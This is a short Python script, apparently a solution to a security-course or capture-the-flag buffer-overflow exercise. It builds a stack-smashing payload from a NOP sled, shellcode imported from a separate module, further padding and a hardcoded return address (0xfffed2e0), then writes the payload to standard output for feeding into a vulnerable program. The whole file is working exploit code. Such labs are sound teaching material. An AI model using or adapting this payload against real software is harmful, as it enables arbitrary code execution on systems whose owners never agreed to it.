#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
pad = 1024 + 12
shellcode_addr = 0xfffed2e0

payload = b'\x90' * (pad - len(shellcode)-512)
payload += shellcode
payload += b'\x90' * (512)
payload += pack('<I', shellcode_addr)

sys.stdout.buffer.write(payload)
